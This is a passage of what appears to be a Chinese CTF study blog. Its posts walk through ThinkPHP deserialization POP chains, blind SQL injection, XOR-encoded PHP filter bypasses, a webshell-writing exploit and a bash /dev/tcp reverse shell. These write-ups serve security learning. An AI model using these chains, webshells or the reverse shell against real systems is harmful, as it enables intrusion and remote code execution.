$this-&gt;options[&#x27;where&#x27;] = &#x27;&#x27;; $this-&gt;pk = &#x27;id&#x27;; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=extractvalue(0x0a,concat(0x0a,(select substr((select flag from test.flag),-20) )))#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); &#125; &#125;&#125;namespace &#123; echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));&#125; Javaweb这题看赵总博客的时候感觉好简单，结果自己做的时候好难【】 打开就是让你访问/login，post过去发现有cookies=deleteme，所以说明是shiro权限问题 然后有个/json，直接访问/json是啥都没有的，post /login过去就说登陆失败，那么/json我们应该也没权限，所以猜测是有权限问题，可以通过url解析绕过 1http:&#x2F;&#x2F;8323fe99-49b2-449a-bbc2-100e2be3ca87.node3.buuoj.cn&#x2F;;&#x2F;json 访问得到回显： 12345678&#123; &quot;timestamp&quot;: 1619772401954, &quot;status&quot;: 400, &quot;error&quot;: &quot;Bad Request&quot;, &quot;exception&quot;: &quot;org.springframework.http.converter.HttpMessageNotReadableException&quot;, &quot;message&quot;: &quot;Required request body is missing: public java.lang.String com.ctf.controller.JsonController.json(java.lang.String) throws java.io.IOException&quot;, &quot;path&quot;: &quot;/;/json&quot;&#125; 题目既然提示让我们post东西过去，我们就尝试着试试看。。 12345678&#123; &quot;timestamp&quot;: 1619772427543, &quot;status&quot;: 500, &quot;error&quot;: &quot;Internal Server Error&quot;, &quot;exception&quot;: &quot;com.fasterxml.jackson.databind.JsonMappingException&quot;, &quot;message&quot;: &quot;Unexpected token (END_ARRAY), expected VALUE_STRING: need JSON String that contains type id (for subtype of java.lang.Object)\\n at [Source: []; line: 1, column: 2]&quot;, &quot;path&quot;: &quot;/;/json&quot;&#125; 百度看看jackson 有什么问题，找到这篇文章： 12https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;182695https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;5792 文章中提到jackson反射库会直接反序列化掉我们的输入.. 但是文章中给出的操作是JDBC的， 再看看给出的几个例子，抄过来发现并没有啥用【 感觉自己不会的东西还是太多了。。。 接着记录mysql的语句： 1select * from websites where id&#x3D;1||if((ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)&#x3D;(database())),1,1)))&gt;100,1,0); 语句： 1http:&#x2F;&#x2F;39.96.91.106:5001&#x2F;?id&#x3D;%27||if((ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)&#x3D;(database())),1,1)))&gt;0,1,0)%23 以及： 1select * from websites where id&#x3D;1||if((ascii(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)in(database())),1,1)))&gt;131,1,0); 1||if((ascii(substr((select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name)in(database())),1,1)))&gt;1,1,0)","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"}]},{"title":"thinkphp5.1反序列化链探索","slug":"thinkphp5-1反序列化链探索","date":"2021-03-31T11:12:18.000Z","updated":"2021-03-31T11:49:04.974Z","comments":true,"path":"2021/03/31/thinkphp5-1反序列化链探索/","link":"","permalink":"http://example.com/2021/03/31/thinkphp5-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%8E%A2%E7%B4%A2/","excerpt":"","text":"该链的思路为从Windows.php触发，具有拼接的file_exists进行操作，之后拼接到Conversion.php上，这里自己还刚复现到一半，主要讲一下自己遇见的困难（可能只有我会遇见的问题） 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace think\\model\\concern&#123; trait Conversion&#123;&#125;&#125;namespace think&#123; abstract class Model&#123; use model\\concern\\Conversion; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model&#123; &#125;&#125;namespace think\\process\\pipes&#123; class Windows extends Pipes&#123; private $files=[]; public function __construct($files=[])&#123; $this-&gt;files = $files; &#125; &#125; abstract class Pipes&#123;&#125; &#125;namespace&#123; $pivot = new think\\model\\Pivot(); $windows = new think\\process\\pipes\\Windows(array($pivot)); echo urlencode(serialize($windows)); &#125; 首先，我遇见第一个问题，如何调用到别的属性，其实用use即可。 第二，是我们如何调用一个trait，这种的话一般我们要寻找一个use到该属性的类，在这里我们找到Model类使用了该类，但是model也是抽象类没办法实例化的，所以我们需要再找model的字类，这里就找到了Pivot类，故我们的写法就如上 = =已经找不到这个版本了，官方如果下载5.1的所有版本都找不到了","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"thinkphp6.0.x反序列化学习","slug":"thinkphp6-0-x反序列化学习","date":"2021-03-30T03:13:51.000Z","updated":"2021-05-06T12:06:27.326Z","comments":true,"path":"2021/03/30/thinkphp6-0-x反序列化学习/","link":"","permalink":"http://example.com/2021/03/30/thinkphp6-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"POP1这在条链当中，我们的最终目的是利用这里进行任意函数调用，因为三个参数全部可控所以我们能够成功操作 我们接下来就找哪里可以触发这里： 之后将会在getAttr中找到这里： 123456789101112public function getAttr(string $name) &#123; try &#123; $relation = false; $value = $this-&gt;getData($name); &#125; catch (InvalidArgumentException $e) &#123; $relation = $this-&gt;isRelationAttr($name); $value = null; &#125;// 上面走完回来继续执行getValue return $this-&gt;getValue($name, $value, $relation); &#125; 先不管如何控制参数，我们再寻找如何触发到getAttr，最后我们就将在Conversion.php当中找到toArray。 中间的代码很多但是没啥用 1234567891011121314151617181920212223public function toArray(): array &#123; foreach ($data as $key =&gt; $val) &#123; if ($val instanceof Model || $val instanceof ModelCollection) &#123; // 关联模型对象 if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) &#123; $val-&gt;visible($this-&gt;visible[$key]); &#125; elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) &#123; $val-&gt;hidden($this-&gt;hidden[$key]); &#125; // 关联模型对象 if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) &#123; $item[$key] = $val-&gt;toArray(); &#125; &#125; elseif (isset($this-&gt;visible[$key])) &#123; $item[$key] = $this-&gt;getAttr($key); #TODO: 最后我们要让他调到这个getAttr函数来来 &#125; elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123; // phpinfo(); $item[$key] = $this-&gt;getAttr($key); &#125; &#125; 那么我们看看如何触发toArray，最后我们就会发现在__toString时可以触发，故我们将其down下来. 12345678910 public function toJson(int $options = JSON_UNESCAPED_UNICODE): string &#123; return json_encode($this-&gt;toArray(), $options); &#125;#TODO: Conversion.php作为后半段起点，通过toString触发 public function __toString() &#123; return $this-&gt;toJson(); &#125; 所以再之后我们就需要寻找可以任意控制参数的__toString方法。在Model方法当中可以寻找到 123456789public function __destruct() &#123; #TODO: 从这里触发 if ($this-&gt;lazySave) &#123; $this-&gt;save(); echo &quot;进入lazySave函数！&quot;.&quot;&lt;br&gt;&quot;; &#125; &#125; 找到save函数 123456789101112131415161718public function save(array $data = [], string $sequence = null): bool &#123; // 数据对象赋值 // phpinfo(); $this-&gt;setAttrs($data); if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#x27;BeforeWrite&#x27;)) &#123; // phpinfo(); return false; &#125; // phpinfo(); #TODO: lazySave函数，为了保证isEmpty为假需要给data赋值 $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence); if (false === $result) &#123; return false; &#125; 我们需要落到updateData函数当中 1234567891011121314151617181920212223242526272829303132333435protected function updateData(): bool &#123; // 事件回调 // phpinfo(); // echo &quot;进入updateDate函数&quot;.&quot;&lt;br&gt;&quot;; if (false === $this-&gt;trigger(&#x27;BeforeUpdate&#x27;)) &#123; // phpinfo(); return false; &#125; // phpinfo(); $this-&gt;checkData(); // 获取有更新的数据 $data = $this-&gt;getChangedData(); if (empty($data)) &#123; // 关联更新 if (!empty($this-&gt;relationWrite)) &#123; $this-&gt;autoRelationUpdate(); &#125; return true; &#125; if ($this-&gt;autoWriteTimestamp &amp;&amp; $this-&gt;updateTime &amp;&amp; !isset($data[$this-&gt;updateTime])) &#123; // 自动写入更新时间 $data[$this-&gt;updateTime] = $this-&gt;autoWriteTimestamp($this-&gt;updateTime); $this-&gt;data[$this-&gt;updateTime] = $data[$this-&gt;updateTime]; &#125; // 检查允许字段 // phpinfo(); $allowFields = $this-&gt;checkAllowFields(); // phpinfo(); 我们要确保调到checkAllowFields函数当中 123456789101112131415161718192021protected function checkAllowFields(): array &#123; // 检测字段 // phpinfo(); // var_dump($this-&gt;field); if (empty($this-&gt;field)) &#123; if (!empty($this-&gt;schema)) &#123; #TODO: // phpinfo(); $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType)); &#125; else &#123; // 就在这里进行了字符串操作 $table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable(); // phpinfo(); $this-&gt;field = $query-&gt;getConnection()-&gt;getTableFields($table); &#125; // phpinfo(); return $this-&gt;field; 在这里我们发现关键的地方就进行了字符串拼接操作，那么我们令$this-&gt;table 为model类即可，但是实际拼接payload当中我们会发现该类无法直接使用，所以需要重新寻找子类 最终得到： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpnamespace think\\model\\concern;trait Conversion&#123;&#125;trait Attribute&#123; private $data; private $withAttr = [&quot;axin&quot; =&gt; &quot;system&quot;]; public function get() &#123; $this-&gt;data = [&quot;axin&quot; =&gt; &quot;ls&quot;]; //你想要执行的命令，这里的键值只需要保持和withAttr里的键值一致即可 &#125;&#125;namespace think;abstract class Model&#123; // use model\\concern\\Attribute; use model\\concern\\Conversion; private $lazySave; private $exists; private $data; private $field; private $schema; private $table; function __construct()&#123; $this-&gt;lazySave = true; $this-&gt;withEvent = false; $this-&gt;exists = true; // $this-&gt;get(); $this-&gt;field = []; $this-&gt;schema = []; $this-&gt;table = true; &#125;&#125;namespace think\\model;use think\\Model;class Pivot extends Model&#123; function __construct($obj=&#x27;&#x27;) &#123; parent::__construct(); $this-&gt;table = $obj; &#125;&#125;$a = new Pivot();$b = new Pivot($a);echo urlencode(serialize($b)); 最后自己写的~ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpnamespace think&#123; abstract class Model&#123; use model\\concern\\Conversion; use model\\concern\\Attribute; protected $json = [&quot;foo&quot;]; private $lazySave =true; private $exists = true; protected $visible = [&quot;foo&quot;]; private $relation = [&quot;foo&quot;=&gt;&quot;12qw3&quot;]; private $data = [&#x27;foo&#x27; =&gt;[&quot;ysllz&quot;=&gt;&quot;dir&quot;]]; //最终要执行的命令，ysllz 这里要保持一致。 private $table; private $withAttr = [&quot;foo&quot;=&gt;[&quot;ysllz&quot;=&gt;&quot;system&quot;]]; protected $jsonAssoc = true; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model&#123; public function __construct($a= null) &#123; $this-&gt;table =$a; &#125; &#125;&#125;namespace think\\model\\concern&#123; trait Conversion&#123; &#125; trait Attribute&#123; &#125;&#125;namespace &#123; use think\\model\\Pivot; $pivot1 = new Pivot(); $pivot2 = new Pivot($pivot1); echo urlencode(serialize($pivot2));&#125; 后面在过客师傅这里又找到两个POP链，感觉很牛赶紧复现了 POP2这是一个文件写入的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace League\\Flysystem\\Cached&#123; interface CacheInterface &#123;&#125;&#125;namespace League\\Flysystem\\Cached\\Storage&#123; use League\\Flysystem\\Cached\\CacheInterface; abstract class AbstractCache implements CacheInterface&#123; protected $autosave = false; &#125; class Adapter extends AbstractCache&#123; protected $complete=&quot;&lt;?php phpinfo(); ?&gt;&quot;; //注意这里有jsonencode,但是不影响 protected $adapter; protected $file = &quot;shell.php&quot;; public function __construct($a) &#123; $this-&gt;adapter = $a; &#125; &#125;&#125;namespace League\\Flysystem\\Adapter&#123; abstract class AbstractAdapter&#123; &#125; class Local extends AbstractAdapter&#123; protected $pathPrefix =&#x27;&#x27;; protected $writeFlags =null; &#125;&#125;namespace&#123; use League\\Flysystem\\Adapter\\Local; use League\\Flysystem\\Cached\\Storage\\Adapter; $loc = new Local(); $ada = new Adapter($loc); echo urlencode(serialize($ada));&#125; 啊感觉还是学到了新姿势，首先可以通过找字类实现了接口，所以不要看到有的抽象类的save无法使用就放弃了，其实也可以的。 入口在AbstractCache的destruct下面 123456789 public function __destruct() &#123;// phpinfo();// var_dump($this-&gt;autosave); if (! $this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125; 然后发现save没法过去，故找一个字类继承了父类的，找到 看到save 一开始我以为是write，所以全局搜索write，找到子类Local 重点就是这个file_put_contents,然后我们发现这三个参数都可以控制= =，但是面临一个问题。 1234 if ($this-&gt;adapter-&gt;has($this-&gt;file)) &#123;// phpinfo(); $this-&gt;adapter-&gt;update($this-&gt;file, $contents, $config); &#125; else &#123; 因为会有$this-&gt;file，如果我们赋值的话就不会进入了，然而然而，我又在当前类找了找update方法，出乎意料的 欸，也能写入，所以直接写进就好了，构造exp出来就有了。 结果：","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"EIS2019_EZPOP","slug":"EIS2019-EZPOP","date":"2021-03-26T11:41:30.000Z","updated":"2021-03-26T11:44:42.234Z","comments":true,"path":"2021/03/26/EIS2019-EZPOP/","link":"","permalink":"http://example.com/2021/03/26/EIS2019-EZPOP/","excerpt":"","text":"题目开局给源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123&lt;?phperror_reporting(0);class A &#123; protected $store; protected $key; protected $expire; public function __construct($store, $key = &#x27;flysystem&#x27;, $expire = null) &#123; $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125; return $contents; &#125; public function getForStorage() &#123; $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125;class B &#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; return $this-&gt;options[&#x27;prefix&#x27;] . $name; &#125; protected function serialize($data): string &#123; if (is_numeric($data)) &#123; return (string) $data; &#125; $serialize = $this-&gt;options[&#x27;serialize&#x27;]; return $serialize($data); &#125; public function set($name, $value, $expire = null): bool&#123; $this-&gt;writeTimes++; if (is_null($expire)) &#123; $expire = $this-&gt;options[&#x27;expire&#x27;]; &#125; $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; // 创建失败 &#125; &#125; $data = $this-&gt;serialize($value); if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123; //数据压缩 $data = gzcompress($data, 3); &#125; $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) &#123; return true; &#125; return false; &#125;&#125;if (isset($_GET[&#x27;src&#x27;]))&#123; highlight_file(__FILE__);&#125;$dir = &quot;uploads/&quot;;if (!is_dir($dir))&#123; mkdir($dir);&#125;unserialize($_GET[&quot;data&quot;]); 一眼就看到了file_put_contents，那么利用肯定也是通过这个，发现他在set方法当中，回溯哪里能用到set方法， A类当中肯定给了： 123456789101112 public function save() &#123; $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125; 这样就简单了。只不过题目还需要绕过等等比较烦，base64比较烦人，其他都还好（指调了好久） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146&lt;?phperror_reporting(0);class A &#123; protected $store; protected $key; protected $expire; public function __construct($store, $key , $expire = null) &#123; $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; &#125; public function cleanContents(array $contents) &#123; $cachedProperties = array_flip([ &#x27;path&#x27;, &#x27;dirname&#x27;, &#x27;basename&#x27;, &#x27;extension&#x27;, &#x27;filename&#x27;, &#x27;size&#x27;, &#x27;mimetype&#x27;, &#x27;visibility&#x27;, &#x27;timestamp&#x27;, &#x27;type&#x27;, ]); foreach ($contents as $path =&gt; $object) &#123; if (is_array($object)) &#123; $contents[$path] = array_intersect_key($object, $cachedProperties); &#125; &#125;// var_dump($contents); return $contents; &#125; public function getForStorage() &#123; $cleaned = $this-&gt;cleanContents($this-&gt;cache);// var_dump($cleaned);// print_r(json_encode([$cleaned, $this-&gt;complete])); return json_encode([$cleaned, $this-&gt;complete]); &#125; public function save() &#123; $contents = $this-&gt;getForStorage();// echo $contents; $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); &#125; public function __destruct() &#123; if (!$this-&gt;autosave) &#123; $this-&gt;save(); &#125; &#125;&#125;class B &#123; protected function getExpireTime($expire): int &#123; return (int) $expire; &#125; public function getCacheKey(string $name): string &#123; return $this-&gt;options[&#x27;prefix&#x27;] . $name; &#125; protected function serialize($data): string &#123;// phpinfo(); if (is_numeric($data)) &#123; return (string) $data; &#125;// print_r($data); $serialize = $this-&gt;options[&#x27;serialize&#x27;];// print_r($serialize);// print_r($serialize($data)); return $serialize($data); &#125; public function set($name, $value, $expire = null): bool&#123; $this-&gt;writeTimes++;// phpinfo(); if (is_null($expire)) &#123; $expire = $this-&gt;options[&#x27;expire&#x27;]; &#125;// var_dump($name); $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name);// print_r($filename); $dir = dirname($filename);// print_r($dir); if (!is_dir($dir)) &#123; try &#123; mkdir($dir, 0755, true); &#125; catch (\\Exception $e) &#123; // 创建失败 &#125; &#125; $data = $this-&gt;serialize($value);// print_r($data); if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) &#123; //数据压缩 $data = gzcompress($data, 3);// print_r($data); &#125;// print_r($filename); $data = &quot;&lt;?php\\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data;// print_r($data);// print_r(base64_decode($data)); $result = file_put_contents($filename, $data); if ($result) &#123;// echo 1; return true; &#125;// echo 1; return false; &#125;&#125;//if (isset($_GET[&#x27;src&#x27;]))//&#123;// highlight_file(__FILE__);//&#125;////$dir = &quot;uploads/&quot;;////if (!is_dir($dir))//&#123;// mkdir($dir);//&#125;$b = new B();$b-&gt;options[&#x27;serialize&#x27;] = &quot;strval&quot;;$b-&gt;options[&#x27;exprie&#x27;] = &quot;1&quot;;$b-&gt;options[&#x27;prefix&#x27;]=&#x27;&#x27;;$b-&gt;options[&#x27;data_compress&#x27;] = null;//key 经过转换后变成filename//contents经过转换后写入到文件当中//$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);$a = new A($b,&#x27;php://filter/write=convert.base64-decode/resource=4.php&#x27;,111);$a-&gt;cache = array(&quot;path&quot;=&gt;&quot;111PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8+&quot;);echo urlencode(serialize($a));","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"ISITDTU2019_EasyPHP","slug":"ISITDTU2019-EasyPHP","date":"2021-03-26T03:31:16.000Z","updated":"2021-03-26T03:49:18.637Z","comments":true,"path":"2021/03/26/ISITDTU2019-EasyPHP/","link":"","permalink":"http://example.com/2021/03/26/ISITDTU2019-EasyPHP/","excerpt":"","text":"开局给出源码： 123456789101112&lt;?php$_ = &#x27;&#x27;;if ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $_) ) die(&#x27;rosé will not do it&#x27;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die(&#x27;you are so close, omg&#x27;);eval($_);?&gt; open_basedir：限定能操作的目录 用这个网站测试匹配了什么： 1https:&#x2F;&#x2F;regex101.com&#x2F; 这个网站就是这个好： 看了大佬的WP知道这个操作，感觉很有用记下来 123456789101112&lt;?php$array=get_defined_functions();//返回所有内置定义函数foreach($array[&#x27;internal&#x27;] as $arr)&#123; if ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;\\`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $arr) ) continue; if ( strlen(count_chars(strtolower($arr), 0x3)) &gt; 0xd ) continue; print($arr.&#x27;&lt;br/&gt;&#x27;);&#125;?&gt; 这样的话我们就可以快速找到有哪些函数可以用了，不过这道题给出的函数并不能用。 那就只能取反来操作了： 12http:&#x2F;&#x2F;0f224c84-f3b8-42e4-9dd3-755cd38520eb.node3.buuoj.cn&#x2F;?_&#x3D;(~%8F%97%8F%96%91%99%90)(); 这样就成功了,查一下disablefunction， 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open, 所有命令执行的函数都被ban了，但是我们还有PHP的原生函数:scan_dir和glob，读取文件的话可以用highlight_file()和readfile 123想要执行的命令如下：print_r(scandir(.));show_source(end(scandir(.))); 分别得出payload： 1((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)); 1((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"命令执行","slug":"命令执行","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}]},{"title":"GYCTF2020_EasyThinking","slug":"GYCTF2020-EasyThinking","date":"2021-03-25T09:14:24.000Z","updated":"2021-03-25T09:22:18.413Z","comments":true,"path":"2021/03/25/GYCTF2020-EasyThinking/","link":"","permalink":"http://example.com/2021/03/25/GYCTF2020-EasyThinking/","excerpt":"","text":"www.zip 可以下载源码 进去先看版本，发现是thinkphp6.0，搜一下CVE，发现有这么一个漏洞 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;god_zzZ&#x2F;article&#x2F;details&#x2F;104275241?utm_medium&#x3D;distribute.pc_relevant.none-task-blog-baidujs_title-1&amp;spm&#x3D;1001.2101.3001.4242 看了看session.php的，嗯，果然滿足利用条件的环境 那么根据作者给出的条件，我们需要再找一个地方，利用到了session函数且值可控，很快就可以找到再这里： 那么利用也很简单了，根据给出的利用方式构造即可： 之后的绕过限制可以用蚁剑一键跑就行。","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/tags/CVE/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"http://example.com/tags/ThinkPHP/"}]},{"title":"nepctf复现","slug":"nepctf复现","date":"2021-03-24T11:05:34.000Z","updated":"2021-03-25T06:19:42.676Z","comments":true,"path":"2021/03/24/nepctf复现/","link":"","permalink":"http://example.com/2021/03/24/nepctf%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"Little_trick这道题目限制的很死，但是这种题目之前就做过了，可以通过写入文件的方式来读取flag的 。 1234567891011&lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET[&#x27;nep&#x27;]; $len = $_GET[&#x27;len&#x27;]; if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13)&#123; eval(substr($nep,0,$len)); &#125;else&#123; die(&#x27;too long!&#x27;); &#125;?&gt; 故通过： 123?nep&#x3D;&#96;ls&gt;z&#96;;&amp;len&#x3D;7?nep&#x3D;&#39;&gt;cat&#39;;&amp;len&#x3D;7?nep&#x3D;&#39;*&gt;z&#39;;&amp;len&#x3D;7 这里还有第二个解： 123456789101112?nep&#x3D;&#96;$nep&#96;;ls&gt;z&amp;len&#x3D;7?nep&#x3D;&#96;$nep&#96;;&gt;cat&amp;len&#x3D;7?nep&#x3D;&#96;$nep&#96;;*&gt;z&amp;len&#x3D;7?nep&#x3D;&#96;$nep&#96;;ls&gt;z&amp;len&#x3D;7 &#x2F;&#x2F; 得到目录下文件名?nep&#x3D;&#96;$nep&#96;;&gt;cat&amp;len&#x3D;7&#x2F;&#x2F; 生成文件名为cat的文件?nep&#x3D;&#96;$nep&#96;;*&gt;z&amp;len&#x3D;7输入通配符*，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数。最后访问文件z即可。 这里其实len=7能做出来应该并非是出题人的本愿，实际上出题人应该是想让人令len=-1 在php中的测试： 解法三没见过： 12345678910111213141516171819202122232425262728293031# -*- coding: UTF-8 -*-import requestsp = r&#x27;&#x27;&#x27;&gt;hp&gt;1.p\\\\&gt;d\\&gt;\\\\&gt;\\ -\\\\&gt;e64\\\\&gt;bas\\\\&gt;7\\|\\\\&gt;XSk\\\\&gt;Fsx\\\\&gt;dFV\\\\&gt;kX0\\\\&gt;bCg\\\\&gt;XZh\\\\&gt;AgZ\\\\&gt;waH\\\\&gt;PD9\\\\&gt;o\\ \\\\&gt;ech\\\\ls -t&gt;0sh 0&#x27;&#x27;&#x27;url = &quot;http://192.168.130.128:10110/47c87ab02c7cac57165d0c568f0542bc/?nep=&#123;&#125;&amp;len=-1&quot;print(&quot;[+]start attack!!!&quot;)for i in p.split(&#x27;\\n&#x27;): print(i) payload = &#x27;`&#x27; + i.strip() + &#x27;`;;&#x27; print(&quot;[*]&quot; + url.format(payload)) requests.get(url.format(payload)) 通过注入的方式把文件写进去 解法4更加易懂： 1?nep&#x3D;&#96;$_GET[1]&#96;;;&amp;len&#x3D;-1&amp;1&#x3D;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;10110 0&gt;&amp;1 easy_tomcat跟VNCTF哪个一样，但是这里咋都弹不出来，先pass bbxhh_revenge这题前面感觉就是🤢 最后一步这里感觉还是相当有趣的 1234567891011121314151617181920212223242526&lt;?phpfunction waf($s)&#123; return preg_replace(&#x27;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\\/\\/|&gt;/i&#x27;, &quot;NepnEpneP&quot;, $s);&#125;if(isset($_GET[&#x27;a&#x27;]))&#123; $_ = waf($_GET[&#x27;a&#x27;]); $__ = waf($_GET[&#x27;b&#x27;]); $a = new $_($__);&#125;else&#123; $a = new Error(&#x27;?&#x27;);&#125;if(isset($_GET[&#x27;c&#x27;]) &amp;&amp; isset($_GET[&#x27;d&#x27;]))&#123; $c = waf($_GET[&#x27;c&#x27;]); $d = waf($_GET[&#x27;d&#x27;]); eval(&quot;\\\\$a-&gt;$c($d);&quot;);&#125;else&#123; $c = &quot;getMessage&quot;; $d = &quot;&quot;; eval(&quot;echo \\\\$a-&gt;$c($d);&quot;);&#125; 